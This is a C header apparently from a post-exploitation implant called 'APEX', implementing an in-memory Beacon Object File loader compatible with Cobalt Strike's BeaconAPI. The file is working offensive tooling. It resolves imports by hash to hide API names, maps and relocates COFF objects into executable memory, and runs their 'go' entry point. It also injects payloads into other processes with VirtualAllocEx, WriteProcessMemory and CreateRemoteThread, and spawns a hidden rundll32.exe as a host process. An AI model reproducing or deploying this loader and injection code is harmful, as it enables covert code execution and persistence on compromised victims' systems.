#ifndef APEX_BOF_H
#define APEX_BOF_H

/*
 * Beacon Object File (BOF) Loader
 * Loads and executes COFF .obj files in-memory, compatible with
 * Cobalt Strike's BOF format and BeaconAPI.
 *
 * All code sections, thunks, and IAT entries are allocated in a single
 * contiguous VirtualAlloc block so that REL32 relocations never overflow
 * on x86_64 (the entire block is well under 2 GB).
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

/* ── COFF structures ─────────────────────────────────────── */

#pragma pack(push, 1)

typedef struct {
    UINT16 Machine;
    UINT16 NumberOfSections;
    UINT32 TimeDateStamp;
    UINT32 PointerToSymbolTable;
    UINT32 NumberOfSymbols;
    UINT16 SizeOfOptionalHeader;
    UINT16 Characteristics;
} COFF_FILE_HEADER;

typedef struct {
    char   Name[8];
    UINT32 VirtualSize;
    UINT32 VirtualAddress;
    UINT32 SizeOfRawData;
    UINT32 PointerToRawData;
    UINT32 PointerToRelocations;
    UINT32 PointerToLinenumbers;
    UINT16 NumberOfRelocations;
    UINT16 NumberOfLinenumbers;
    UINT32 Characteristics;
} COFF_SECTION;

typedef struct {
    union {
        char ShortName[8];
        struct { UINT32 Zeroes; UINT32 Offset; } Long;
    } Name;
    UINT32 Value;
    INT16  SectionNumber;
    UINT16 Type;
    UINT8  StorageClass;
    UINT8  NumberOfAuxSymbols;
} COFF_SYMBOL;

typedef struct {
    UINT32 VirtualAddress;
    UINT32 SymbolTableIndex;
    UINT16 Type;
} COFF_RELOC;

#pragma pack(pop)

/* COFF relocation types (x86_64) */
#define IMAGE_REL_AMD64_ADDR64   0x0001
#define IMAGE_REL_AMD64_ADDR32NB 0x0003
#define IMAGE_REL_AMD64_REL32    0x0004
#define IMAGE_REL_AMD64_REL32_1  0x0005
#define IMAGE_REL_AMD64_REL32_2  0x0006
#define IMAGE_REL_AMD64_REL32_3  0x0007
#define IMAGE_REL_AMD64_REL32_4  0x0008
#define IMAGE_REL_AMD64_REL32_5  0x0009

#ifndef IMAGE_SYM_CLASS_EXTERNAL
#define IMAGE_SYM_CLASS_EXTERNAL        2
#endif
#ifndef IMAGE_SYM_CLASS_STATIC
#define IMAGE_SYM_CLASS_STATIC          3
#endif
#ifndef IMAGE_SYM_CLASS_LABEL
#define IMAGE_SYM_CLASS_LABEL           6
#endif

/* ── BeaconAPI output buffer ─────────────────────────────── */

#define BOF_OUTPUT_SIZE 65536

static char  g_bof_output[BOF_OUTPUT_SIZE];
static DWORD g_bof_output_len = 0;

/* ── BeaconAPI functions (CS-compatible) ─────────────────── */

typedef struct {
    char  *original;
    char  *buffer;
    int    length;
    int    size;
} datap;

static void BeaconDataParse(datap *parser, char *buffer, int size) {
    if (!parser) return;
    parser->original = buffer;
    parser->buffer   = buffer;
    parser->length   = size;
    parser->size     = size;
}

static int BeaconDataInt(datap *parser) {
    if (!parser || parser->length < 4) return 0;
    int val;
    memcpy(&val, parser->buffer, 4);
    parser->buffer += 4;
    parser->length -= 4;
    return val;
}

static short BeaconDataShort(datap *parser) {
    if (!parser || parser->length < 2) return 0;
    short val;
    memcpy(&val, parser->buffer, 2);
    parser->buffer += 2;
    parser->length -= 2;
    return val;
}

static int BeaconDataLength(datap *parser) {
    return parser ? parser->length : 0;
}

static char *BeaconDataExtract(datap *parser, int *size) {
    if (!parser || parser->length < 4) { if (size) *size = 0; return NULL; }
    int len;
    memcpy(&len, parser->buffer, 4);
    parser->buffer += 4;
    parser->length -= 4;
    if (len > parser->length) len = parser->length;
    char *ptr = parser->buffer;
    parser->buffer += len;
    parser->length -= len;
    if (size) *size = len;
    return ptr;
}

static void BeaconOutput(int type, char *data, int len) {
    (void)type;
    if (g_bof_output_len + (DWORD)len < BOF_OUTPUT_SIZE) {
        memcpy(g_bof_output + g_bof_output_len, data, len);
        g_bof_output_len += len;
    }
}

static void BeaconPrintf(int type, char *fmt, ...) {
    char buf[8192];
    va_list args;
    va_start(args, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    if (n > 0) BeaconOutput(type, buf, n);
}

static BOOL BeaconUseToken(HANDLE token) { return ImpersonateLoggedOnUser(token); }
static void BeaconRevertToken(void) { RevertToSelf(); }
static BOOL BeaconIsAdmin(void) {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
    PSID adminGroup;
    if (AllocateAndInitializeSid(&auth, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}
static void BeaconGetSpawnTo(BOOL x86, char *buffer, int length) {
    (void)x86;
    if (length > 0) strncpy(buffer, "C:\\Windows\\System32\\rundll32.exe", length - 1);
}
static BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken,
                                         STARTUPINFOA *si, PROCESS_INFORMATION *pi) {
    (void)x86; (void)ignoreToken;
    return CreateProcessA(NULL, "C:\\Windows\\System32\\rundll32.exe",
                          NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, si, pi);
}
static void BeaconInjectProcess(HANDLE hProcess, int pid, char *payload, int payloadLen,
                                 int offset, char *arg, int argLen) {
    (void)pid; (void)arg; (void)argLen;
    if (!hProcess || !payload || payloadLen <= 0) return;

    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, (SIZE_T)payloadLen,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) return;

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remoteMem, payload, (SIZE_T)payloadLen, &written) ||
        written != (SIZE_T)payloadLen) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return;
    }

    DWORD oldProt;
    VirtualProtectEx(hProcess, remoteMem, (SIZE_T)payloadLen, PAGE_EXECUTE_READ, &oldProt);

    LPTHREAD_START_ROUTINE entry = (LPTHREAD_START_ROUTINE)((BYTE*)remoteMem + offset);
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, entry, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, 30000);
        CloseHandle(hThread);
    }
}

static void BeaconInjectTemporaryProcess(PROCESS_INFORMATION *pi, char *payload, int payloadLen,
                                          int offset, char *arg, int argLen) {
    if (!pi || !pi->hProcess || !payload || payloadLen <= 0) return;

    BeaconInjectProcess(pi->hProcess, pi->dwProcessId, payload, payloadLen,
                        offset, arg, argLen);
    CloseHandle(pi->hThread);
    CloseHandle(pi->hProcess);
}

/* ── External symbol resolution (hash-based, no plaintext) ─ */

static UINT32 bof_djb2(const char *str) {
    UINT32 h = 5381;
    int c;
    while ((c = *str++))
        h = ((h << 5) + h) + (UINT32)c;
    return h;
}

typedef struct { UINT32 hash; PVOID addr; } bof_api_entry;

static const bof_api_entry g_beacon_api[] = {
    { 0xE2494BA2u, (PVOID)BeaconDataParse },
    { 0xAF1AFDD2u, (PVOID)BeaconDataInt },
    { 0xE2835EF7u, (PVOID)BeaconDataShort },
    { 0x22641D29u, (PVOID)BeaconDataLength },
    { 0x80D46722u, (PVOID)BeaconDataExtract },
    { 0x6DF4B81Eu, (PVOID)BeaconOutput },
    { 0x700D8660u, (PVOID)BeaconPrintf },
    { 0x889E48BBu, (PVOID)BeaconUseToken },
    { 0xF2744BA6u, (PVOID)BeaconRevertToken },
    { 0x566264D2u, (PVOID)BeaconIsAdmin },
    { 0x1E7C9FB9u, (PVOID)BeaconGetSpawnTo },
    { 0xD6C57438u, (PVOID)BeaconSpawnTemporaryProcess },
    { 0x0EA75B09u, (PVOID)BeaconInjectProcess },
    { 0x9E22498Cu, (PVOID)BeaconInjectTemporaryProcess },
    { 0, NULL }
};

static PVOID resolve_bof_import(const char *name) {
    UINT32 h = bof_djb2(name);
    for (int i = 0; g_beacon_api[i].addr; i++) {
        if (h == g_beacon_api[i].hash)
            return g_beacon_api[i].addr;
    }

    /* CS BOF convention: Library$Function */
    const char *dollar = strchr(name, '$');
    if (!dollar) {
        PVOID addr = (PVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), name);
        if (addr) return addr;
        addr = (PVOID)GetProcAddress(GetModuleHandleA("ntdll.dll"), name);
        if (addr) return addr;
        addr = (PVOID)GetProcAddress(GetModuleHandleA("user32.dll"), name);
        if (addr) return addr;
        addr = (PVOID)GetProcAddress(GetModuleHandleA("advapi32.dll"), name);
        if (addr) return addr;
        addr = (PVOID)GetProcAddress(GetModuleHandleA("msvcrt.dll"), name);
        return addr;
    }

    size_t libLen = (size_t)(dollar - name);
    char lib[128], func[256];
    if (libLen >= sizeof(lib)) return NULL;
    memcpy(lib, name, libLen);
    lib[libLen] = '\0';
    strncpy(func, dollar + 1, sizeof(func) - 1);
    func[sizeof(func) - 1] = '\0';

    if (!strstr(lib, ".dll") && !strstr(lib, ".DLL")) {
        strncat(lib, ".dll", sizeof(lib) - strlen(lib) - 1);
    }

    HMODULE hMod = GetModuleHandleA(lib);
    if (!hMod) hMod = LoadLibraryA(lib);
    if (!hMod) return NULL;

    return (PVOID)GetProcAddress(hMod, func);
}

/* ── COFF Loader ─────────────────────────────────────────── */

static const char *coff_symbol_name(COFF_SYMBOL *sym, const char *strTab) {
    static char nameBuf[256];
    if (sym->Name.Long.Zeroes != 0) {
        memcpy(nameBuf, sym->Name.ShortName, 8);
        nameBuf[8] = '\0';
        return nameBuf;
    }
    return strTab + sym->Name.Long.Offset;
}

/* Thunk: mov rax, <64-bit addr>; jmp rax  =  12 bytes */
#define THUNK_SIZE      12
#define MAX_BOF_IMPORTS 512
#define MAX_BOF_SECTIONS 64

/*
 * bof_exec: Load and execute a COFF object file in-memory.
 *   bof_data / bof_len: raw .obj file bytes
 *   args / args_len: packed argument buffer (BeaconDataParse format)
 *   output / output_max / output_len: receives BOF output text
 * Returns 0 on success.
 */
static int bof_exec(const unsigned char *bof_data, size_t bof_len,
                    const unsigned char *args, size_t args_len,
                    char *output, size_t output_max, DWORD *output_len)
{
    if (bof_len < sizeof(COFF_FILE_HEADER)) return -1;

    g_bof_output_len = 0;
    g_bof_output[0] = '\0';

    COFF_FILE_HEADER *hdr = (COFF_FILE_HEADER *)bof_data;
    int numSections = hdr->NumberOfSections;
    if (numSections <= 0 || numSections > MAX_BOF_SECTIONS) return -1;

    COFF_SECTION *sections = (COFF_SECTION *)(bof_data + sizeof(COFF_FILE_HEADER));
    COFF_SYMBOL  *symTab   = (COFF_SYMBOL *)(bof_data + hdr->PointerToSymbolTable);
    const char   *strTab   = (const char *)(symTab + hdr->NumberOfSymbols);

    /* ─── Phase 1: Calculate total memory for one contiguous block ─── */

    size_t secOffsets[MAX_BOF_SECTIONS];
    size_t totalSize = 0;

    for (int i = 0; i < numSections; i++) {
        secOffsets[i] = totalSize;
        DWORD sz = sections[i].SizeOfRawData;
        if (sz == 0) sz = sections[i].VirtualSize;
        if (sz == 0) { continue; }
        totalSize += (sz + 0xFu) & ~(size_t)0xFu;
    }

    size_t thunkAreaOff = totalSize;
    totalSize += MAX_BOF_IMPORTS * THUNK_SIZE;
    size_t iatAreaOff = totalSize;
    totalSize += MAX_BOF_IMPORTS * sizeof(PVOID);

    /* ─── Phase 2: Single allocation ─── */

    BYTE *codeBlock = (BYTE *)VirtualAlloc(NULL, totalSize,
                                           MEM_COMMIT | MEM_RESERVE,
                                           PAGE_READWRITE);
    if (!codeBlock) return -1;

    /* ─── Phase 3: Map sections into the block ─── */

    PVOID secMem[MAX_BOF_SECTIONS];
    memset(secMem, 0, sizeof(secMem));

    for (int i = 0; i < numSections; i++) {
        DWORD sz = sections[i].SizeOfRawData;
        if (sz == 0) sz = sections[i].VirtualSize;
        if (sz == 0) { continue; }

        secMem[i] = codeBlock + secOffsets[i];

        if (sections[i].SizeOfRawData > 0 && sections[i].PointerToRawData > 0)
            memcpy(secMem[i], bof_data + sections[i].PointerToRawData, sections[i].SizeOfRawData);
        else
            memset(secMem[i], 0, sz);
    }

    int thunkCount = 0;
    int iatCount   = 0;
    int loadOk     = 1;

    /* ─── Phase 4: Process relocations ─── */

    for (int i = 0; i < numSections; i++) {
        if (!secMem[i] || sections[i].NumberOfRelocations == 0) continue;
        COFF_RELOC *relocs = (COFF_RELOC *)(bof_data + sections[i].PointerToRelocations);

        for (int r = 0; r < sections[i].NumberOfRelocations; r++) {
            COFF_SYMBOL *sym = &symTab[relocs[r].SymbolTableIndex];
            const char *symName = coff_symbol_name(sym, strTab);
            PVOID symAddr = NULL;

            if (sym->SectionNumber > 0) {
                int secIdx = sym->SectionNumber - 1;
                if (secIdx < numSections && secMem[secIdx])
                    symAddr = (BYTE*)secMem[secIdx] + sym->Value;
            } else if (sym->StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
                       sym->SectionNumber == 0) {
                const char *importName = symName;
                if (strncmp(importName, "__imp_", 6) == 0) importName += 6;

                symAddr = resolve_bof_import(importName);
                if (!symAddr) {
                    g_bof_output_len += (DWORD)snprintf(
                        g_bof_output + g_bof_output_len,
                        BOF_OUTPUT_SIZE - g_bof_output_len,
                        "[BOF ERROR] Unresolved symbol: %s\n", symName);
                    loadOk = 0;
                    goto done;
                }

                if (strncmp(symName, "__imp_", 6) == 0) {
                    /*
                     * __imp_ symbol: create IAT entry (pointer-to-function).
                     * The instruction is `call/mov [rip+disp32]` — indirect.
                     * The IAT entry is inside codeBlock, so disp32 is safe.
                     */
                    if (iatCount >= MAX_BOF_IMPORTS) { loadOk = 0; goto done; }
                    PVOID *iatEntry = (PVOID *)(codeBlock + iatAreaOff +
                                                (size_t)iatCount * sizeof(PVOID));
                    *iatEntry = symAddr;
                    iatCount++;
                    symAddr = iatEntry;
                } else {
                    /*
                     * Plain extern symbol (no __imp_ prefix): direct `call rip+disp32`.
                     * The target function may be in the EXE image (>2 GB away).
                     * Create a trampoline thunk inside codeBlock:
                     *   mov rax, <abs64>   ; 48 B8 <8 bytes>
                     *   jmp rax            ; FF E0
                     */
                    if (thunkCount >= MAX_BOF_IMPORTS) { loadOk = 0; goto done; }
                    BYTE *thunk = codeBlock + thunkAreaOff +
                                  (size_t)thunkCount * THUNK_SIZE;
                    thunk[0] = 0x48; thunk[1] = 0xB8;
                    UINT64 target64 = (UINT64)(ULONG_PTR)symAddr;
                    memcpy(thunk + 2, &target64, 8);
                    thunk[10] = 0xFF; thunk[11] = 0xE0;
                    thunkCount++;
                    symAddr = thunk;
                }
            }

            if (!symAddr) continue;

            BYTE *patchAddr = (BYTE*)secMem[i] + relocs[r].VirtualAddress;

            switch (relocs[r].Type) {
            case IMAGE_REL_AMD64_ADDR64:
                *(UINT64*)patchAddr += (UINT64)(ULONG_PTR)symAddr;
                break;
            case IMAGE_REL_AMD64_ADDR32NB:
                *(UINT32*)patchAddr += (UINT32)((ULONG_PTR)symAddr - (ULONG_PTR)patchAddr - 4);
                break;
            case IMAGE_REL_AMD64_REL32:
                *(UINT32*)patchAddr += (UINT32)((ULONG_PTR)symAddr - (ULONG_PTR)patchAddr - 4);
                break;
            case IMAGE_REL_AMD64_REL32_1:
                *(UINT32*)patchAddr += (UINT32)((ULONG_PTR)symAddr - (ULONG_PTR)patchAddr - 5);
                break;
            case IMAGE_REL_AMD64_REL32_2:
                *(UINT32*)patchAddr += (UINT32)((ULONG_PTR)symAddr - (ULONG_PTR)patchAddr - 6);
                break;
            case IMAGE_REL_AMD64_REL32_3:
                *(UINT32*)patchAddr += (UINT32)((ULONG_PTR)symAddr - (ULONG_PTR)patchAddr - 7);
                break;
            case IMAGE_REL_AMD64_REL32_4:
                *(UINT32*)patchAddr += (UINT32)((ULONG_PTR)symAddr - (ULONG_PTR)patchAddr - 8);
                break;
            case IMAGE_REL_AMD64_REL32_5:
                *(UINT32*)patchAddr += (UINT32)((ULONG_PTR)symAddr - (ULONG_PTR)patchAddr - 9);
                break;
            }
        }
    }

    /* ─── Phase 5: Flip RW → RX, find and call "go" entry point ─── */

    if (loadOk) {
        DWORD oldProt;
        VirtualProtect(codeBlock, totalSize, PAGE_EXECUTE_READ, &oldProt);

        PVOID entryPoint = NULL;
        for (DWORD s = 0; s < hdr->NumberOfSymbols; s++) {
            const char *sn = coff_symbol_name(&symTab[s], strTab);
            if ((strcmp(sn, "go") == 0 || strcmp(sn, "_go") == 0) &&
                symTab[s].SectionNumber > 0) {
                int secIdx = symTab[s].SectionNumber - 1;
                entryPoint = (BYTE*)secMem[secIdx] + symTab[s].Value;
                break;
            }
            s += symTab[s].NumberOfAuxSymbols;
        }

        if (!entryPoint) {
            g_bof_output_len += (DWORD)snprintf(
                g_bof_output + g_bof_output_len,
                BOF_OUTPUT_SIZE - g_bof_output_len,
                "[BOF ERROR] Entry point 'go' not found\n");
        } else {
            typedef void (*bof_entry_t)(char*, int);
            bof_entry_t entry = (bof_entry_t)entryPoint;
            entry((char*)args, (int)args_len);
        }
    }

done:
    /* Copy output */
    if (output && output_max > 0) {
        DWORD copyLen = g_bof_output_len;
        if (copyLen >= (DWORD)output_max) copyLen = (DWORD)output_max - 1;
        memcpy(output, g_bof_output, copyLen);
        output[copyLen] = '\0';
        if (output_len) *output_len = copyLen;
    }

    VirtualFree(codeBlock, 0, MEM_RELEASE);
    return 0;
}

#endif /* APEX_BOF_H */
